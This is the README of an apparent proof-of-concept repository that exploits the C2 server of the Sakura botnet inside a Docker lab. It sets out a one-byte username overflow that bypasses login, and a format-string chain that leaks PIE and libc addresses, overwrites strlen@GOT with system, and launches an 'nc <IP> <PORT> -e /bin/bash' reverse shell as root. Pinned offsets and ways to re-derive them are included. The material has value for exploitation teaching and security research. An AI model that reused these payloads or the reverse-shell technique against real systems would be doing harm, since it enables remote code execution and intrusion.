# Sakura PWNED

This repository contains two exploits for the [Sakura botnet](https://github.com/AndrillEng1/Sakura-Qbot-Botnet) C2 (`Sakura_CNC.c`), using memory-safety bugs in the operator login. This is a proof-of-concept, for educational purposes only.

## File Structure

| Path | Description |
|------|-----------|
| `botnet/Sakura_CNC.c` | The C2 server (operator login + attack commands). |
| `botnet/Sakura_Bot.c` | The bot that connects back to the C2. |
| `botnet/Sakura_Login.txt` | `username password` per line, loaded as operator accounts. |
| `Sakura` | The exact binary this PoC targets (see below), not an official build. |
| `exploits/login_bypass.py` | Auth bypass via the username overflow. |
| `exploits/reverse_shell.py` | Format-string RCE to reverse shell. |
| `Dockerfile.cnc` | The vulnerable C2 server + `/root/flag.txt`. |
| `Dockerfile.exploit` | The attacker box: python, pwntools, the exploits. |
| `docker-compose.yml` | Runs both, sharing one network stack (same `127.0.0.1`). |

## Docker Setup

`Sakura` ships prebuilt because the exploit constants are pinned to that exact build, and recompiling would shift the offsets and break them. It needs `GLIBC_2.38`, which Ubuntu 24.04 provides. Two containers run it: `cnc` is the vulnerable C2, and `exploit` is the attacker box carrying python, pwntools, and the exploits. To build and run both containers, execute:

```sh
docker compose up -d --build     
```

To open a shell in the attacker box, run:

```sh
docker compose exec exploit bash
```

To tear it all down, run:

```sh
docker compose down
```

## The Bugs

Both bugs are in `BotWorker()` (`Sakura_CNC.c:275`). Accounts are fixed-size with no bounds checks:

```c
struct Sakura_login { char username[100]; char password[100]; };  // :31
static struct Sakura_login accounts[100];                          // :34
int find_line;                              // :277 (never initialized)
sprintf(accounts[find_line].username, buf); // :315
```

Line 315 has two bugs at once:

1. **Format string.** `buf`, which is user-supplied input, is the format string of `sprintf`, giving arbitrary read and write.
2. **Unbounded write.** A 100-byte field indexed by an uninitialized `find_line` with no length limit, so it overflows into the next field in the struct.

The `STATS` command (`:532`) prints the stored username back, so anything the format string produces at line 315 is readable to an operator, giving a read oracle.

## Exploit 1: Login Bypass (`login_bypass.py`)

This logs you in as an operator with no valid credentials. In the struct, `username[100]` and `password[100]` sit next to each other, so overflowing the username field lets us overwrite the password field. Send a 101-byte username. The write runs one byte past `username`, dropping a known byte plus a NUL terminator at the front of `password`. Then send a password that matches the corrupted field:

```python
sock.send(b"a" * (USERNAME_LEN + 1) + b"\n")   # overflow username by 1 byte
sock.send(b"a" + b"\0" * (BUF_LEN - 1))         # password field is now "a"
```

That lands you at the logged-in `Sakura]~:` prompt. That is just the C2's own command menu, not a shell on the machine, so this cannot read the flag. From the attacker shell, run:

```sh
python3 exploits/login_bypass.py 127.0.0.1 54321
# at the Sakura]~: prompt, run an operator command to confirm the session:
HELP
STATS
```

## Exploit 2: Format-String RCE (`reverse_shell.py`)

This is the full chain to a shell: a PIE then ASLR bypass, then a GOT overwrite that turns the server into a reverse shell. Everything runs through the format-string bug at `:315` and the `STATS` read-back oracle at `:532`.

The exploit keeps one logged-in connection open as the read channel. Each leak sends its format string on a separate fresh connection, which writes the result into the shared `accounts[]`, then reads it back by sending `STATS` on the open connection.

1. **Defeat PIE.** `%1$ld` leaks the pointer sitting in the format string's first argument slot, which on this build points into the `accounts` array in `.bss`. Because that pointer is always a fixed distance above the image base, we can derive the image base:
   ```
   pie_base = leak(%1$ld) - PIE_LEAK_DELTA
   ```
   The result must be page-aligned. If it is not, the constants need re-deriving for your build.
2. **Defeat ASLR (libc).** With the image base known, `puts@GOT` has a concrete address. Plant that address in the input buffer and aim a `%s` at it, so `sprintf` prints the resolved runtime address sitting in the GOT slot. Then `libc_base = puts_leak - libc.sym.puts`.
3. **Hijack control flow.** `fmtstr_payload` uses `%n` to overwrite `strlen@GOT` with `system`. From then on, every `strlen()` call in the server is really `system()`. Reconnect and send a username of `nc <IP> <PORT> -e /bin/bash`. The login handler runs that buffer through `trim()` (`:313`), whose first act is `strlen(buf)`, which executes the command and connects the shell back to your listener.

The CNC runs the callback `nc`, which dials `127.0.0.1:4444`, where the listener sits on the shared network stack. Open two shells into the attacker box, and run:

```sh
nc.traditional -lvnp 4444                                  # shell A: listener
python3 exploits/reverse_shell.py ./Sakura 127.0.0.1 54321   # shell B: fire the exploit
```

The shell lands in shell A as root. Run the following to confirm the RCE and grab the flag:

```sh
id                  # uid=0(root)
cat /root/flag.txt  # flag{...}
```

### Constants

These constants match the bundled `Sakura` (built with `gcc 15.1.1 20250425` on kernel `5.10.237-1-MANJARO`). Recompiling shifts the layout and breaks `BUF_OFFSET` / `LEAK_ARG` / `PIE_LEAK_DELTA`, so re-derive them with gdb.

| Constant | Value | Meaning |
|----------|-------|---------|
| `BUF_OFFSET` | `1019` | Format-arg index of the input buffer. |
| `LEAK_ARG` | `1` | `%1$ld`, first variadic slot, an `accounts` pointer. |
| `PIE_LEAK_DELTA` | `0xb7ace0` | `leak - PIE_LEAK_DELTA = PIE base`. |


To re-derive them against a rebuilt `Sakura`:

- **`LEAK_ARG`** and **`PIE_LEAK_DELTA`**: find the leaking slot over the network first, by sweeping `%1$p`, `%2$p`, `%3$p`, and so on and reading each back through `STATS`, until one returns a pointer into the image. That index is `LEAK_ARG`. gdb supplies the fixed offset: break at the `sprintf` on `:315` and read both the pointer in that slot and the image's real load base, then subtract to get `PIE_LEAK_DELTA = slot_pointer - image_base`.
- **`BUF_OFFSET`**: the positional index `%N$` at which the format string reaches your own input buffer, which `fmtstr_payload` needs so it can plant the target address in the buffer and aim its `%n` write at that index. We brute-forced it: pick an index, run the exploit, and step it up until the write lands and the chain succeeds.

## Disclaimer

For authorized security research and education only. Run only against systems you own or have written permission to test. Unauthorized access is illegal. No liability is accepted for any damage or misuse. Use at your own risk.
